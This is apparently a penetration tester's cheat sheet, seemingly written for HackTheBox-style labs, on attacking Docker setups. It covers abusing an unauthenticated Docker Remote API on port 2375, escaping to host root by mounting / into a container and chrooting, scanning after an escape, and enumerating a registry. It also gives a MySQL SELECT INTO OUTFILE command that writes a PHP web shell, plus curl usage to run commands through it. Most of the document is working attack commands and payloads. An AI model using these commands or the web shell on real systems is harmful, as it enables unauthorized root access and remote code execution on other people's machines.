### Use this to knock on some ports
https://github.com/grongor/knock

### Cheat-sheet
https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker

### Port 2375  Docker REST API
Remote API is running by default on 2375 port when enabled. The service by default will not require authentication allowing an attacker to start a privileged docker container. By using the Remote API one can attach hosts / (root directory) to the container and read/write files of the host’s environment.

### How to enumerate with port 2375 (directly from your machine)
```
docker -H tcp://'machine-ip':2375 ps
```

### Priviledge Escalation from a Container --> root
```
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash    or       docker run -v /:/mnt --rm -it alpine chroot /mnt sh
or
docker -H tcp://'machine-ip':2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
```
You can get a static binary of docker: https://master.dockerproject.org/linux/x86_64/docker

### Docker escape tips
When you are in a docker container and you want to escape, run a nmap binary https://github.com/opsec-infosec/nmap-static-binaries
from **/tmp** and scan the whole /24 network within the Docker container to find the IP and possible open ports of the Docker host.
Sometimes ssh could be open only from Docker host/guest subnet...

### Docker registry, port 5000
`curl -s http://dev01.htb:5000/v2/_catalog`
(this will show the catalog)
`curl -s http://dev01.htb:5000/v2/alpine/tags/list`
(this will show the tags of a image)
https://github.com/andrey-pohilko/registry-cli
(check layers in a image)

## PE via DB
A method that's not quite as common is Exploitation. Exploits to escape Containers aren't as common and typically rely on abusing a process running on the host machine. Exploits usually require some level of user interaction, for example, CVE-2019-14271. It can also be beneficial to use a container enumeration script such as DEEPCE, [[https://github.com/stealthcopter/deepce]].

Since we gained access to a remote database, we can utilize it to gain command execution and escape the container from MySQL.
The basic methodology for exploiting MySQL can be found below.
```
    Access the remote database using administrator credentials
    Create a new table in the main database
    Inject PHP code to gain command execution
    Example code: <?php $cmd=$_GET["cmd"];system($cmd);?>
    Drop table contents onto a file the user can access
    Execute and obtain RCE on the host.
```

Looking at the above exploit may seem complicated, but we can break it down further and provide more context to make it simpler.
We can use a single command to inject our PHP code into a table and save the table into a file on the remote system. We are writing any code that we want onto the remote system from this command, which we can then execute, giving use code execution. Find the command used below.
```
Command used: select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
```

Now that we have a file that we control dropped on the system, we can curl the address and obtain RCE from the dropped file. Find example usage below.
```
Example usage: curl 127.0.0.1:8080/shell.php?cmd=whoami
```
